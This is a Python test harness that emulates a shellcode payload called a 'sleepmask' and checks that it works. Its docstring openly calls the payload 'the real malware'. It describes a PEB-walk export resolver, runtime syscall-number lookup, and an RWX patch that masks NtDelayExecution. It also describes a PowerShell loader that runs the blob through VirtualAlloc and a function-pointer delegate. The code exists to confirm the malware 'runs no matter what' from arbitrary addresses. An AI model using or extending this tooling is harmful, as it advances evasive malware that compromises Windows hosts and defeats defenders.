#!/usr/bin/env python3
"""test_shellcode_sleepmask.py — the REAL payload, in the SAC-proof entry mode.

build/sleepmask.bin is the flagship blob (PEB walk -> ntdll exports ->
NtProtectVirtualMemory RWX -> 12-byte `mov rax,<stub>; jmp rax` mask over
NtDelayExecution -> masked call polls KeQuerySystemTime -> byte-exact restore
-> done_flag=1 -> ret). Unlike the PE we ship, the blob is fully self-
contained PIC: it never references a byte before its own entry (the 9-byte
trampoline is a separate thing), so it can be placed at ANY RWX address and
entered with a plain `call` — exactly what run-shell.ps1 does once
VirtualAlloc hands powershell.exe an arbitrary address and
Marshal.GetDelegateForFunctionPointer turns it into a delegate.

This test proves the real malware (not just the beacon) "runs no matter what":
at each of four arbitrary RWX addresses it is `call`ed in the ABI delegate
state (RSP = 8 mod 16, return slot pre-pushed) and must, with BOTH the real
syscall numbers and decoy numbers (proving they are read from the export
prologues at runtime, not hard-coded):

  - resolve ntdll via the PEB walk and all three exports BY NAME,
  - NtProtectVirtualMemory the 12 NtDelayExecution bytes (RWX, then restore) —
    and NO other syscall (the masked call never reaches a syscall),
  - be observed writing the mask 48 B8 <8-byte ptr into the blob> FF E0,
  - poll KeQuerySystemTime past the 250 ms timeout inside the mask,
  - restore the original 12 bytes byte-exactly,
  - set done_flag, return to the return slot, R15 (sentinel) preserved.

Exit 0 pass / 1 fail / 2 build problem.
"""

import struct
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent

from unicorn import (  # noqa: E402
    Uc, UC_ARCH_X86, UC_MODE_64, UC_HOOK_CODE, UC_HOOK_MEM_WRITE,
)
from unicorn.x86_const import (  # noqa: E402
    UC_X86_REG_RIP,
    UC_X86_REG_RAX,
    UC_X86_REG_RSP,
    UC_X86_REG_R15,
    UC_X86_REG_GS_BASE,
)

BLOB_BIN = ROOT / "build" / "sleepmask.bin"

# Four arbitrary RWX landing addresses (same regions as test_shellcode_entry):
# the sort of thing VirtualAlloc hands out on a real machine.
SHELL_TARGETS = (
    (0x400000000000, 0x40),
    (0x400000000000, 0x1040),
    (0x700000000000, 0x5040),
    (0x700000000000, 0x8040),
)
SHELL_REGION = 0x100000

# --- fake-env layout (same shape as run_harness.py) --------------------------
PEB_ADDR   = 0x00002000
LDR_ADDR   = 0x00003000
LDR_ENTRY  = 0x00004000
NAME_ADDR  = 0x00005000
NTDLL_BASE = 0x100000
CLOCK      = 0x00500000
STACK      = 0x00600000
STACK_SZ   = 0x00020000

ND_OFF  = 0x1000   # NtDelayExecution thunk
NP_OFF  = 0x1100   # NtProtectVirtualMemory thunk
KQ_OFF  = 0x1200   # KeQuerySystemTime (real code: advances CLOCK, returns &CLOCK)

SENTINEL_R15 = 0x0123456789ABCDEF
JUNK_RAX     = 0xDEADBEEFCAFEBABE

NR_DELAY_REAL, NR_PROTECT_REAL = 0x3D, 0x2B
NR_DELAY_DECOY, NR_PROTECT_DECOY = 0x4F, 0x5C

TIMEOUT_VAL = 2500000   # in the blob: 2500000 * 100ns = 250 ms
TICK        = 100000    # the fake KeQuery advances CLOCK by this per call

NAMES = [b"NtDelayExecution\0", b"NtProtectVirtualMemory\0", b"KeQuerySystemTime\0"]


def q(v):
    return struct.pack("<Q", v)


def build_env(uc, nr_delay, nr_protect):
    w = uc.mem_write
    # --- PEB / Ldr chain ----------------------------------------------------
    w(0x60, q(PEB_ADDR))
    w(PEB_ADDR + 0x18, q(LDR_ADDR))            # PEB->Ldr
    w(LDR_ADDR + 0x10, q(LDR_ENTRY))           # InLoadOrder head
    w(LDR_ENTRY + 0x00, q(LDR_ADDR + 0x10))    # entry Flink -> head (circular)
    w(LDR_ENTRY + 0x30, q(NTDLL_BASE))         # DllBase
    w(LDR_ENTRY + 0x58, struct.pack("<H", 18)) # BaseDllName.Length (bytes)
    w(LDR_ENTRY + 0x60, q(NAME_ADDR))          # BaseDllName.Buffer
    w(NAME_ADDR, "ntdll.dll".encode("utf-16-le"))

    # --- fake ntdll PE (modern x64 export-dir layout) -----------------------
    w(NTDLL_BASE + 0x3C, struct.pack("<I", 0x100))      # e_lfanew
    w(NTDLL_BASE + 0x100, b"PE\0\0")
    opt = NTDLL_BASE + 0x118
    w(opt, struct.pack("<H", 0x20B))                   # PE32+ magic
    w(opt + 0x70, struct.pack("<I", 0x200))            # ExportDir.RVA
    edir = NTDLL_BASE + 0x200
    w(edir + 0x14, struct.pack("<I", len(NAMES)))      # NumberOfFunctions
    w(edir + 0x18, struct.pack("<I", len(NAMES)))      # NumberOfNames
    w(edir + 0x1C, struct.pack("<I", 0x300))           # EAT RVA
    w(edir + 0x20, struct.pack("<I", 0x380))           # ENT RVA
    w(edir + 0x24, struct.pack("<I", 0x400))           # ORD RVA
    for i, name in enumerate(NAMES):
        w(NTDLL_BASE + 0x300 + 4 * i, struct.pack("<I", 0x1000 + 0x100 * i))
        w(NTDLL_BASE + 0x380 + 4 * i, struct.pack("<I", 0x500 + 0x80 * i))
        w(NTDLL_BASE + 0x400 + 2 * i, struct.pack("<H", i))
        w(NTDLL_BASE + 0x500 + 0x80 * i, name)

    # --- the three "export" thunks ------------------------------------------
    w(NTDLL_BASE + ND_OFF, bytes([0xB8, nr_delay, 0, 0, 0, 0x0F, 0x05, 0xC3,
                                  0, 0, 0, 0]))
    w(NTDLL_BASE + NP_OFF, bytes([0xB8, nr_protect, 0, 0, 0, 0x0F, 0x05, 0xC3,
                                  0, 0, 0, 0]))
    # KeQuerySystemTime: movabs rax,CLOCK ; add qword [rax],TICK ; ret
    w(NTDLL_BASE + KQ_OFF,
      b"\x48\xB8" + q(CLOCK) + b"\x48\x81\x00" + struct.pack("<I", TICK) + b"\xC3")


def run_one(base, off, nr_delay, nr_protect, blob: bytes) -> list:
    p = []
    uc = Uc(UC_ARCH_X86, UC_MODE_64)
    uc.mem_map(0, 0x100000)                 # low page: gs:0x60 -> PEB chain
    uc.mem_map(NTDLL_BASE, 0x100000)        # fake ntdll
    uc.mem_map(base, SHELL_REGION)          # arbitrary RWX landing region
    uc.mem_map(CLOCK, 0x100000)
    uc.mem_map(STACK, STACK_SZ)
    uc.reg_write(UC_X86_REG_GS_BASE, 0)
    build_env(uc, nr_delay, nr_protect)

    shell_addr = base + off
    uc.mem_write(shell_addr, blob)

    nd_addr = NTDLL_BASE + ND_OFF
    original = bytes(uc.mem_read(nd_addr, 12))
    trace = []
    mask_writes = []

    def on_code(uc_, rip, size, _):
        if bytes(uc_.mem_read(rip, 2)) == b"\x0F\x05":
            trace.append(uc_.reg_read(UC_X86_REG_RAX) & 0xFFFFFFFF)
            uc_.reg_write(UC_X86_REG_RAX, 0)      # STATUS_SUCCESS
            uc_.reg_write(UC_X86_REG_RIP, rip + 2)
            uc_.emu_stop()

    def on_mem_write(uc_, access, address, size, value, _):
        if nd_addr <= address < nd_addr + 12:
            mask_writes.append((address - nd_addr, size, value))

    uc.hook_add(UC_HOOK_CODE, on_code)
    uc.hook_add(UC_HOOK_MEM_WRITE, on_mem_write)

    uc.reg_write(UC_X86_REG_R15, SENTINEL_R15)
    uc.reg_write(UC_X86_REG_RAX, JUNK_RAX)
    ret_addr = STACK + 0x8000
    rsp = STACK + 0x108                     # = 8 (mod 16): the delegate's `call` state
    uc.mem_write(rsp, q(ret_addr))          # the `call`'s return slot
    uc.reg_write(UC_X86_REG_RSP, rsp)

    # The CODE hook emu_stops on every syscall (it must: the trap emulates the
    # nt call by advancing RIP by hand). So emulate in rounds, resuming after
    # each trap, until the blob `ret`s — exactly what run_harness.py does.
    rip = shell_addr
    for _ in range(128):
        uc.emu_start(rip, until=ret_addr, count=200_000)
        new_rip = uc.reg_read(UC_X86_REG_RIP)
        if new_rip == ret_addr:
            rip = new_rip
            break
        if new_rip == rip and not trace:
            break                               # spun with no syscall: bail out
        rip = new_rip
    if rip != ret_addr:
        p.append(f"RIP {rip:#x} != return slot {ret_addr:#x} (blob did not return)")
    if uc.reg_read(UC_X86_REG_R15) != SENTINEL_R15:
        p.append(f"R15 clobbered: {uc.reg_read(UC_X86_REG_R15):#x}")

    done_off = len(blob) - 84               # done_flag slot (data tail)
    done = struct.unpack("<Q", uc.mem_read(shell_addr + done_off, 8))[0]
    if done != 1:
        p.append(f"done_flag == {done}, expected 1")

    restored = bytes(uc.mem_read(nd_addr, 12))
    if restored != original:
        p.append(f"NtDelayExecution not restored: {restored.hex(' ')}")

    if trace != [nr_protect, nr_protect]:
        p.append(f"syscalls {[hex(n) for n in trace]} != "
                 f"[{nr_protect:#x}, {nr_protect:#x}] (want exactly the two "
                 f"NtProtects; the masked NtDelayExecution must never syscall)")

    clock = struct.unpack("<Q", uc.mem_read(CLOCK, 8))[0]
    if not (TIMEOUT_VAL <= clock <= TIMEOUT_VAL + 2 * TICK):
        p.append(f"clock {clock} did not poll past the {TIMEOUT_VAL} timeout")

    # the mask itself, observed in flight:
    byte_writes = {off_: val & 0xFF for off_, sz, val in mask_writes if sz == 1}
    for want, expect in ((0, 0x48), (1, 0xB8), (10, 0xFF), (11, 0xE0)):
        if byte_writes.get(want) != expect:
            p.append(f"mask byte [{want}] = "
                    f"{byte_writes.get(want, None) and hex(byte_writes[want])}, "
                    f"expected {expect:#x}")
    stub_ptrs = [val for off_, sz, val in mask_writes if sz == 8 and off_ == 2]
    if not stub_ptrs:
        p.append("no 8-byte stub-pointer write at mask offset +2")
    elif not (shell_addr <= stub_ptrs[0] < shell_addr + len(blob)):
        p.append(f"stub ptr {stub_ptrs[0]:#x} not inside the blob image")
    covered = set()
    for off_, sz, _ in mask_writes:
        covered.update(range(off_, off_ + sz))
    if covered != set(range(12)):
        p.append(f"mask/restore never touched all 12 bytes: {sorted(covered)}")
    return p


def main() -> int:
    if not BLOB_BIN.exists():
        print("FAIL: missing build/sleepmask.bin — run build.sh first")
        return 2
    blob = BLOB_BIN.read_bytes()

    all_problems = []
    for base, off in SHELL_TARGETS:
        for label, nd_, np_ in (
                ("real", NR_DELAY_REAL, NR_PROTECT_REAL),
                ("decoy", NR_DELAY_DECOY, NR_PROTECT_DECOY)):
            probs = run_one(base, off, nd_, np_, blob)
            addr = base + off
            print(f"[{addr:#x} {label}] ok" if not probs
                  else f"[{addr:#x} {label}] " + "; ".join(probs))
            all_problems += [f"[{addr:#x} {label}] {pr}" for pr in probs]

    for pr in all_problems:
        print(f"RUN FAIL: {pr}")
    if all_problems:
        print("FAIL")
        return 1
    print("PASS (shellcode: the REAL sleepmask payload `call`ed at 4 arbitrary "
          "RWX addresses x real + decoy nr -> PEB-walk resolve, RWX mask over "
          "NtDelayExecution observed in flight, 250 ms KeQuery poll, byte-exact "
          "restore, done_flag=1, clean return; R15 preserved)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
